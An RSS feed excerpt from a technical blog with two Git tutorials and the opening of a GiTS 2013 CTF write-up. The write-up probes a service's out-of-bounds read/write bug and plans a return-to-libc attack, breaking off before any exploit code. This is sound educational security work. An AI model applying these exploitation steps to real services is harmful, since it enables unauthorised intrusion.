2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util</code></pre>
<p>This is unnecessary and results in duplicate information, copied from one year to the other.</p>
<p>The solution is pretty simple: identify the last commit for each CDL session/year, tag it and then, if required create branches out of it.</p>
<p>Identifying the last commit for each CDL session is easily done through <code>gitk</code>. Browse the commits, look at the dates, identify the last commit and create a tag:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2009 e9858a9e74
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2010 26cd285f47
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-spring eaa2d7e9a8
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-fall f69e679ebd
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2012 fd23db9181</code></pre>
<p>Afterwards, we can create branches for each of them to easily go to that point:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2012 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-fall 2011-fall
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-spring 2011-spring
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2010 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2009 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch
  br-2009
  br-2010
  br-2011-fall
  br-2011-spring
  br-2012
* master
  old-master
  razvan</code></pre>
<p>Of course, it would only makes sense to really clear the repository and turn it into a “normal” one that only stores current information. Remove old year data and show only current one:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2011
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git mv 2013/* .
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ rmdir 2013
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
Makefile  curs1  curs3  git.mm  git_tutorial  schelet_inscriere  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git commit -m &#39;Clear folder structure. Leave only current items&#39;</code></pre>
<p>All is now nice and clear. Any updates are going to be done on the current folder structure; any request to see old data can be handled by checking out one of the branches.</p>
<h2 id="branches-on-a-virtual-machine">Branches on a Virtual Machine</h2>
<p>In our experience we come to situations when required to work on the desktop/laptop and on a virtual machine. Of course, we are using Git for storing code. It would only make sense for one repository to be a remote for another one. The case is that, with Git, every repository can be a remote.</p>
<p>As such, I usually create a clone of the laptop repository on the virtual machine. I usually do that with the <a href="http://ocw.cs.pub.ro/courses/so2/" title="SO2">SO2</a> repository when updating lab tasks or assignment solutions and tests. The laptop stores the main repository and the virtual machine uses a clone of that:</p>
<pre><code>root@spook:~# git clone razvan@einherjar.local:school/current/so2/git-repos/lab lab.git
root@spook:~# cd lab.git/
root@spook:~/lab.git# git remote show origin
* remote origin
  Fetch URL: razvan@einherjar.local:school/current/so2/git-repos/lab
  Push  URL: razvan@einherjar.local:school/current/so2/git-repos/lab
[...]</code></pre>
<p>In order to work properly on the remote you would need to use a dedicated branch to push information. You’ll have problems if you push to the master branch of a repository that is using the master branch itself. I usually dub this ‘vm’ (for virtual machine):</p>
<pre><code>root@spook:~/lab.git# git checkout -b vm
Switched to a new branch &#39;vm&#39;</code></pre>
<p>Any further changes are going to be committed in the ‘vm’ branch. Subsequently you would push these commits to the main repository, on the laptop:</p>
<pre><code>root@spook:~/lab.git# git push origin vm
Total 0 (delta 0), reused 0 (delta 0)
To razvan@einherjar.local:school/current/so2/git-repos/lab
 * [new branch]      vm -&gt; vm</code></pre>
<p>On the main repository, you would just merge or rebase your changes from that branch:</p>
<pre><code>razvan@einherjar:~/school/current/so2/git-repos/teme$ git rebase vm
First, rewinding head to replay your work on top of it...
Fast-forwarded master to vm.</code></pre>
<p>At this moment, all changes in the repository clone on the virtual machine are present in the master branch on the repository on the laptop. You need to create a separate branch on the virtual machine clone and then push that branch to the main repository. If you would work on the master branch on the virtual machine clone and push that, it would be problematic to integrate those changes in the master branch on the main repository.</p>
<h2 id="going-after-cherries">Going After Cherries</h2>
<p>In some cases, when working with multiple branches, it might happen that you need a specific commit from one branch but you don’t want to merge that branch into your current one.</p>
<p>Fortunately, Git allows you to pick a single commit as easy as picking cherries from a cherry-tree. In fact, the command is <code>git cherry-pick</code>.</p>
<pre><code>$ git cherry-pick 1904c3d4c9720
[master 3a30153] File to be cherry-picked in master.
 Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 file_to_get_in_master</code></pre>
<p>Now, you have a <strong>new</strong> commit with the same change as the picked-up commit but on your branch</p>
<pre><code>$ git log
commit 3a3015378c3c1b43c4895a00829034d53fb9a5b5
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Fri Mar 8 23:59:07 2013 +0200

    File to be cherry-picked in master.</code></pre>
<p>As you can see, the commit hash is different meaning that there is a new commit, not the old one.</p>
<p>Should a commit not apply cleanly, Git stops the cherry-picking process and asks for human intervention. After the problems are resolved, you can continue it with <code>git cherry-pick --continue</code>. Or, you can abort it via <code>--abort</code> if you change your mind after seeing the trouble.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Fri, 22 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-2.html</guid>
</item>
<item>
    <title>Git Is The Answer 1/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-1.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-1.html" title="Git Is The Answer 1/3">Git Is The Answer 1/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 18, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>We focus again on <a href="http://git-scm.com/" title="Git">git</a>. This time, we will present some real-world scenarios where knoweldge of advance git topics helps. In order to keep down the length of the article, our presentation is divided in 3 parts, this being the first one of these.</p>
<h2 id="user-setup">User Setup</h2>
<p>After installing Git and before doing any commits into a repository, you must setup your user information and preferences. It is common to make a global configuration, using <code>git config</code>:</p>
<pre><code>git config --global user.name &quot;Razvan Deaconescu&quot;
git config --global user.email &quot;razvan.deaconescu@cs.pub.ro&quot;
git config --global color.ui auto</code></pre>
<p>You should make this setup for each account you are using. At the minimum, you are going to use it at least for your laptop or workstation.</p>
<p>Global configuration is stored in <code>~/.gitconfig</code>.</p>
<p>In case you want to use another username within a repository, use the <code>git config</code> command in that repository, but without the <code>--global</code> option:</p>
<pre><code>cd /path/to/repository.git
git config user.email &quot;razvan@rosedu.org&quot;</code></pre>
<p>In the above setup, I have only updated the email address for the repository. The other options used are picked from the global configuration.</p>
<p>Per repository configuration is stored in <code>/path/to/repository.git/.config</code>.</p>
<h2 id="handling-line-endings-like-a-pro">Handling Line Endings Like a Pro</h2>
<p>From time to time it is possible that you will have to work with people working on a different operating system. It is no problem if both of you are using systems with similar line-endings (<code>CRLF</code> for Windows, <code>LF</code> for Linux/OSX). In all other cases, it might be that the default Git options used for this don’t work for you.</p>
<p>You can configure Git globally to handle line-endings if you set the <code>core.autocrlf</code> option in your <code>~/.gitconfig</code>. However, the best settings are different on different platforms.</p>
<p>For Windows you would use</p>
<pre><code>git config --global core.autocrlf true</code></pre>
<p>While for Linux/OSX you would use</p>
<pre><code>git config --global core.autocrlf input</code></pre>
<p>You must remember that these changes are valid only for you, and for the operating systems which have these settings configured. To have the settings travel with the repository you have to go a different path: you have to create a <code>.gitattributes</code> file with a content similar to</p>
<pre><code>* text=auto
*.c text
*.h text
*.sln text eol=crlf
*.png binary
*.jpg binary</code></pre>
<p>The first line tells git to handle the line endings of all <strong>text</strong> files automatically. The second two lines declare that <code>.c</code> and <code>.h</code> files are to be treated as text (thus their line endings are to be converted to the proper format). The <code>.sln</code> line uses a new parameter (<code>eol=crlf</code>) which tells Git to normalize files on commit but to always checkout them with <code>CRLF</code> endings. Use this for files which need to have <code>CRLF</code> endings, even on Linux. A similar settings exists for <code>LF</code> endings.</p>
<p>Finally, there are cases when you need to commit binary files into the repository. In this cases, changing <code>LF</code> characters to <code>CRLF</code> or the reverse will break the binary. You have to tell Git not to handle them, thus you’ll specify <code>binary</code> in <code>.gitattributes</code> file.</p>
<p>If the repository already contained some files commited, after creating the <code>.gitattributes</code> file each of you will have files show up as modified, even if they haven’t changed. This is because of the line endings changes which was not followed by repository renormalization. To solve this, you have to do the following steps (on a <strong>clean</strong> repository, otherwise changes will be lost).</p>
<p>First, remove everything from the index and reset both the index and the working directory (the risky part):</p>
<pre><code>git rm --cached -r .
git reset --hard</code></pre>
<p>Finally, stage all files which were normalized and create a normalizing commit</p>
<pre><code>git add .
git commit -m &quot;Normalized line endings&quot;</code></pre>
<p>From now on, Git will properly do the job of handling line endings for you.</p>
<h2 id="how-to-create-and-setup-a-local-repo">How to Create and Setup a Local Repo</h2>
<p>One of the best features of Git is the ability to rapidly create and use local repositories. You don’t have to create a repository and then clone it locally as you do in Subversion. You just create or access a directory and then initialize it as a Git repository. Changes to files in the directory will be able to be handled as commits.</p>
<p>Assuming I am working on a personal project, the first thing I would do is create a directory and initialize it as a Git repository. I recommend you append the <code>.git</code> extension:</p>
<pre><code>mkdir ~/projects/troscot.git
git init ~/projects/troscot.git</code></pre>
<p>The first thing you add in a repository is a <code>.gitignore</code> file stating the files you wish to ignore. Such a sample file is <a href="https://github.com/razvand/snippets/blob/master/config/gitignore" title="gitignore file">here</a>.</p>
<p>You just create the <code>.gitignore</code> file in the repository root and then add it to the repository:</p>
<pre><code>vi .gitignore
git add .gitignore
git commit -m &#39;Initial commit. Add global .gitignore file&#39;</code></pre>
<p>After this, one would create, add and commit any files required.</p>
<p>Another use case is adding repository support for existing directories. This may happen when there is some pieces of code you already have in place and want to place in a repository or, my personal use case, adding repository support to configuration directories. For example, if one would want to use versioning for Apache2 configuration files, one would issue (as <code>root</code>):</p>
<pre><code>cd /etc/apache2/
git init .
vi .gitignore
git add .gitignore
git commit -m &#39;Initial commit. Add global .gitignore file&#39;
git add .
git status
git commit -m &#39;Initial commit. Add all config files to repository&#39;</code></pre>
<p>The above commands add a <code>.gitignore</code> file in the repository and then add all Apache2 configuration files. The <code>git status</code> command is always necessary after a <code>git add</code> command to make sure you are committing the right stuff; you may need to update your <code>.gitignore</code> file in case you’ve missed ignoring certain types of files.</p>
<h2 id="i-want-to-tweak-a-commit">I Want To Tweak A Commit</h2>
<p>From time to time you realize that you have made something wrong with a commit. Either you forgot to add a good, descriptive <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html" title="A Note About Git Commit Messages">message</a> or you have really screwed up some parts of the committed code. Maybe you have some compile errors to fix or your commit does too many things at once.</p>
<p>Anyway, for all of these cases, Git allows you to rewrite the commit at will. You can add changes of tweak metadata (author name, commit message, etc.) just by issuing the needed commands and ending with</p>
<pre><code>git commit --amend</code></pre>
<p>However, this works only for the tip of the current branch. If you want to change a commit which is not HEAD, you’ll need to do a rebase process. This will temporarily move HEAD to the commit you want to change, allowing you to use the above procedure. It is best to start the rebase interactively, so that you can have great control over what it does:</p>
<pre><code>git rebase -i cf80a4ad6d64bff2</code></pre>
<p>The above will open your editor (configurable via <code>git config</code>) with a content similar to the following one (you can see it on the disk if you really want to, it is in the repository, in <code>.git/rebase/git-rebase-todo</code>)</p>
<pre><code>pick 899e7e6 Add Silviu&#39;s contributions.
pick 02f1ef9 Add contribs to Cristian Mocanu.
pick 98194cd Add contributions of Andru Gheorghiu.
pick 2931f1d Add 2 contributions of spopescu.

# Rebase cf80a4a..2931f1d onto cf80a4a
#
# Commands:
#  p, pick = use commit
#  r, reword = use commit, but edit the commit message
#  e, edit = use commit, but stop for amending
#  s, squash = use commit, but meld into previous commit
#  f, fixup = like &quot;squash&quot;, but discard this commit&#39;s log message
#  x, exec = run command (the rest of the line) using shell
#
# These lines can be re-ordered; they are executed from top to bottom.
#
# If you remove a line here THAT COMMIT WILL BE LOST.
#
# However, if you remove everything, the rebase will be aborted.
#
# Note that empty commits are commented out</code></pre>
<p>As you can see, you can select an action to be applied for each one of the commits. If you only want to edit the commit message, you will change <code>pick</code> with <code>reword</code> (or <code>r</code>). If you want to edit the content of the commit you will select <code>edit</code>. You can even reorder commits, squash them one a bigger one, etc.</p>
<p>For now, we will focus on editing the contents of one commit. We will change last line in <code>edit</code>.</p>
<pre><code>e 2931f1d Add 2 contributions of spopescu.</code></pre>
<p>The rebase process continues and tries to do what we’ve said it to do. In our case, it will stop at commit <code>2931f1d</code> to allow editing it:</p>
<pre><code>Stopped at 2931f1d... Add 2 contributions of spopescu.
You can amend the commit now, with

    git commit --amend

Once you are satisfied with your changes, run

    git rebase --continue</code></pre>
<p>Now, you can add or remove content, change the commit as you want, etc. Then, you continue the rebase process by running <code>git commit --amend</code> followed by <code>git rebase --continue</code>. Both of them are needed.</p>
<p>If you decide that the commit is ok and that the rebase was not neeeded, you can always abort it with <code>git rebase --abort</code>.</p>
<p>Finally, keep in mind that <strong>it is not recommended to change commits once they have been pushed to another repository.</strong></p>
<h2 id="but-my-commit-is-too-big">But My Commit Is Too Big</h2>
<p>From time to time, you will have some big changes to commit. However, the case when all of them are atomic and cannot be split into several shorter components is very rare. Let’s take for our example a LaTeX Beamer file. You can commit each section separately or even each slide, as you see fit. But how can you split the commit?</p>
<p>Actually, you can use two commands for this. One is <code>git add -i</code> to allow interactive adding of parts of commits. The second one is to use <code>git add -p</code> which is more simpler.</p>
<p>Running <code>git add -p</code> will present you with the first chunk of changes to be committed. It might be the case that this is chunk is atomic or not. Git offers this question after presenting the hunk:</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]?</code></pre>
<p>Selecting <code>?</code> will print the help text and the chunk afterwards. The help text is</p>
<pre><code>y - stage this hunk
n - do not stage this hunk
q - quit; do not stage this hunk nor any of the remaining ones
a - stage this hunk and all later hunks in the file
d - do not stage this hunk nor any of the later hunks in the file
g - select a hunk to go to
/ - search for a hunk matching the given regex
j - leave this hunk undecided, see next undecided hunk
J - leave this hunk undecided, see next hunk
k - leave this hunk undecided, see previous undecided hunk
K - leave this hunk undecided, see previous hunk
s - split the current hunk into smaller hunks
e - manually edit the current hunk
? - print help</code></pre>
<p>Now, you can use these options to split your commit or edit it. Editing is the most advanced feature of <code>git add -p</code>, the only one who needs more explaining. So let’s choose this.</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]? e</code></pre>
<p>Again, we will be presented with an editor to edit the contents of <code>.git/addp-hunk-edit.diff</code>. The comment at the end of the file is self-explanatory:</p>
<pre><code># To remove &#39;-&#39; lines, make them &#39; &#39; lines (context).
# To remove &#39;+&#39; lines, delete them.
# Lines starting with # will be removed.
#
# If the patch applies cleanly, the edited hunk will immediately be
# marked for staging. If it does not apply cleanly, you will be given
# an opportunity to edit again. If all lines of the hunk are removed,
# then the edit is aborted and the hunk is left unchanged.</code></pre>
<p>The <code>-</code> lines are lines which will be removed by the commit and the <code>+</code> ones will be added. Thus, if you remove a <code>+</code> line, the commit will not contain the addition and if you mark one <code>-</code> line as context it won’t be removed by the commit.</p>
<p>Since <code>git add -p</code> is a powerful feature, it is advisable to have it added as an alias, via <code>git config</code>. For example, I have <code>git gap</code> do the same thing as <code>git alias -p</code>. Then, it is in my muscles’ memory to type <code>git gap</code> when adding changes for a new commit.</p>
<h2 id="i-dont-want-this-commit-anymore">I Don’t Want This Commit Anymore</h2>
<p>There is often the case that you want to rollback a change you’ve done. As long as everything is happening locally (i.e. you haven’t pushed to a remote repository), Git offers the proper tools to handle this.</p>
<p>Assume you’ve updated a file but you want to discard those changes. You’ve just done some tests and feel those are not required and want to get back to the initial version. Then you would issue</p>
<pre><code>git checkout file-name</code></pre>
<p>This above command restores the file to the repository version. It’s very useful in case you make a mess in a local file.</p>
<p>A quite often situation is preparing to make a commit. When you do that you use one or more <code>git add</code> commands to prepare the commit; sometimes you use a <code>git add .</code> command that gives you little control on what to add to the staging area. You find out that you’ve added too much content to the staging area. In order to remove that extra content from the staging area (and leave it in the working directory), one issues:</p>
<pre><code>git reset HEAD file-name</code></pre>
<p>If you want to start building your commit from the beginning and discard all information in the staging area, you would use:</p>
<pre><code>git reset HEAD</code></pre>
<p>When leaving out the file name, all content from the staging area is discarded.</p>
<p>Consider that you’ve done some bad commits and you’ve just found out. The last two commits are really bad and need to be dropped. As long as you haven’t pushed anything, you can rework those commits: you can reset the repository HEAD and leave the commit changes in the working directory. If we want to redo the last two commits we would just issue:</p>
<pre><code>git reset HEAD^^</code></pre>
<p>Remember, this doesn’t remove the commit changes. The repository HEAD is simply moved back and the commit changes are left in the working directory; you will then use them to create proper new commits.</p>
<h2 id="i-want-to-change-this-file-silently">I Want To Change This File Silently</h2>
<p>GitHub has an excellent article on <a href="https://help.github.com/articles/ignoring-files" title="GitHub: Ignoring files">ignoring files</a>. A particular situation is ignoring updates to files that are already in the repository (i.e. they’ve been previously commited and can’t be ignored using .gitignore).</p>
<p>This kind of situation is part of my repository with letters of recommendation. I’m using a Makefile for compiling out a letter and have isolated in it some variables:</p>
<pre><code>$ cat Makefile
PERSON = Alexandru_Juncu
FOLDER = alexandru-juncu

include base.mk</code></pre>
<p>When I would create a new recommendation I update the <code>Makefile</code> to compile it. However this change needn’t make it to the repository. If I would do that then each time I’m only compiling out an old letter of recommendation I would change the Makefile file and push the new changes; or, if I don’t want to push those changes, I would need to use <code>git checkout</code>.</p>
<p>The best solution would be for any updates to the Makefile to not be considered. The initial Makefile file would be stored in the repository (as a model) but subsequent changes should not be visible. This can be done by using:</p>
<pre><code>git update-index --assume-unchanged Makefile</code></pre>
<p>No changes on the <code>Makefile</code> file are going to be considered in the working directory.</p>
<p>If you want to revert this option, use:</p>
<pre><code>git update-index --no-assume-unchanged Makefile</code></pre>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Mon, 18 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-1.html</guid>
</item>
<item>
    <title>GiTS 2013 CTF -- return-to-libc -- pwnable 250</title>
    <link>http://techblog.rosedu.org/ctf-return-to-libc.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/ctf-return-to-libc.html" title="GiTS 2013 CTF -- return-to-libc -- pwnable 250">GiTS 2013 CTF -- return-to-libc -- pwnable 250</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on February 19, 2013</span>
      by
      <span class="author">Lucian Cojocar</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/exploit.html">exploit</a>, <a href="/tags/ctf.html">ctf</a>, <a href="/tags/return-to-libc.html">return-to-libc</a>, <a href="/tags/strace.html">strace</a>, <a href="/tags/debugging.html">debugging</a>, <a href="/tags/gdb.html">gdb</a>, <a href="/tags/write-up.html">write-up</a></span>
      </span>

      <h1 id="introduction">Introduction</h1>
<p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
<h1 id="hello-binary">Hello binary!</h1>
<p>Let’s start by inspecting the binary.</p>
<ul>
<li><p>32bit dynamically linked binary</p>
<pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre></li>
<li><p>it waits for connections on port 31337</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
listen(3, 20)                           = 0
accept(3, </code></pre></li>
</ul>
<p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
<pre><code>	$ telnet localhost 31337
	Trying ::1...
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is &#39;^]&#39;.
	Connection closed by foreign host.
	$</code></pre>
<p>It immediately drops connection.</p>
<p>Let’s have a look at what happens when we are connecting to it.</p>
<pre><code>	$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
	[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
	[pid 4359] fork()                                                                   = 4361
	[pid 4359] close(4)                                                                 = 0
	[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
	[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
	[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
	[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
	Failed to find user back2skool: Success
	 &lt;unfinished ...&gt;
	[pid 4361] +++ exited (status 255) +++</code></pre>
<p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
<p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
<p>After we setup the user we can see the following output when connecting:</p>
<pre><code>	$ telnet localhost 31337
	Trying ::1...
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is &#39;^]&#39;.
	    __  ___      __  __   _____
	   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
	  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
	 / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
	/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
	===============================================
	Welcome to MathServ! The one-stop shop for all your arithmetic needs.
	This program was written by a team of fresh CS graduates using only the most
	agile of spiraling waterfall development methods, so rest assured there are
	no bugs here!
	
	Your current workspace is comprised of a 10-element table initialized as:
	{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
	
	Commands:
		read	Read value from given index in table
		write	Write value to given index in table
		func1	Change operation to addition
		func2	Change operation to multiplication
		math	Perform math operation on table
		exit	Quit and disconnect
	exit
	Exiting program!
	Connection closed by foreign host.
	$</code></pre>
<h1 id="the-vulnerability">The vulnerability</h1>
<h4 id="high-level">High-level</h4>
<p>The output of the program is self-explanatory. Let’s try some commands.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
3</code></pre>
<p>Nothing special.</p>
<pre><code>Input position to read from:
10
Value at position 10: 134519224</code></pre>
<p>We can read <strong>past</strong> our table!</p>
<pre><code>Input position to read from:
-200
Value at position -200: 0</code></pre>
<p>We can read <strong>below</strong> our table!</p>
<pre><code>read
Input position to read from:
90000
Connection closed by foreign host.</code></pre>
<p>The program received <code>SIGSEGV</code> and the socket was closed. At least we can crash the program; in fact we are only crashing the child that has been spawned to handle our connection.</p>
<p>But what about write?</p>
<pre><code>$ telnet localhost 31337
write
Input position to write to:
0
Input numeric value to write:
1
Value at position 0: 1</code></pre>
<p>Nothing special.</p>
<pre><code>write
Input position to write to:
10
Table index too large!</code></pre>
<p>Bummer, we cannot <strong>write past</strong> our table!</p>
<pre><code>write
Input position to write to:
-1
Input numeric value to write:
42
Value at position -1: 42
write
Input position to write to:
-10000 
Input numeric value to write:
999
Connection closed by foreign host.</code></pre>
<p>Heh, we can <strong>write below</strong> our table!</p>
<h4 id="low-level">Low-level</h4>
<p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src='/images/ida-atoi-read.png' alt="Read - atoi"/></p>
<p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
<p><img style="float:center" src='/images/ida-atoi-write.png' alt="Write - atoi"/></p>
<p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
<p>{% highlight cpp %} int i; i = atoi(str); if (i &gt; 9) { error(); exit(); } do_stuff; {% endhighlight %}</p>
<p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
<p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
<h1 id="the-exploit">The exploit</h1>
<p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
<h3 id="do-we-have-any-rwx-place-to-store-the-payload">Do we have any RWX place to store the payload?</h3>
<pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
[...]

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x022a8 0x022a8 R E 0x1000
  LOAD           0x002e68 0x0804be68 0x0804be68 0x00204 0x00214 RW  0x1000
  DYNAMIC        0x002e7c 0x0804be7c 0x0804be7c 0x000d8 0x000d8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x001e94 0x08049e94 0x08049e94 0x000c4 0x000c4 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
[...]</code></pre>
<p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
<h3 id="is-aslr-enabled">Is ASLR enabled?</h3>
<p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
<h3 id="where-shall-we-write">Where shall we write?</h3>
<p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
<p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
<h3 id="do-we-know-the-address-of-the-buffer">Do we know the address of the buffer?</h3>
<p>There are three cases where the buffer might be located: * on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address; * on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job; * declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</p>
<p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
<p><img style="float:center" src='/images/ida-values.png' alt="Values buffer"/></p>
<p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
<p><img style="float:center" src='/images/ida-indirect-jump.png' alt="Indirect jump via math_ptr"/></p>
<p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
